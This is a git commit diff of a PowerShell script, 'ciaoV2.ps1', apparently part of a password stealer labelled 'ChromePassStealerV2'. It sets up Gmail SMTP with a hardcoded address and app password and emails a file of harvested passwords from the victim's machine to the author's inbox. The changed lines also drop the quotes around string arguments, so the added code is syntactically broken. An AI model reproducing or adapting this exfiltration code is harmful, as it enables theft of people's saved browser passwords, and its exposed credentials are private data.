ecd7b9a4e00fe5fa0e9ba1bf2eae16aa99bf486e
Frankie476 <60293394+Frankie476@users.noreply.github.com>
2023-01-11 22:41:01 -0500

    Add files via upload

--- ciaoV2.ps1
+++ ciaoV2.ps1
@@ -14,10 +14,10 @@ Start-Sleep -Seconds 60 #Wait for 60 seconds (because connected devices file tak
 $SMTPServer = 'smtp.gmail.com'
 $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
 $SMTPInfo.EnableSsl = $true
-$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('steelefrank9@gmail.com', 'crxdghgujdptqnsm') #Email with which you want to send information
+$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential(steelefrank9@gmail.com, crxdghgujdptqnsm) #Email with which you want to send information
 $ReportEmail = New-Object System.Net.Mail.MailMessage
-$ReportEmail.From = 'steelefrank9@icloud.com' #Email in which you want to receice the information
-$ReportEmail.To.Add('steelefrank9@icloud.com') #Email in which you want to receive the information
+$ReportEmail.From = steelefrank9@icloud.com #Email in which you want to receice the information
+$ReportEmail.To.Add(steelefrank9@icloud.com) #Email in which you want to receive the information
 $ReportEmail.Subject = 'ChromePassStealerV2'
 $ReportEmail.Body = 'Attached is your list of informations.'
 $ReportEmail.Attachments.Add('C:\Users\Public\Documents\passwords.txt')
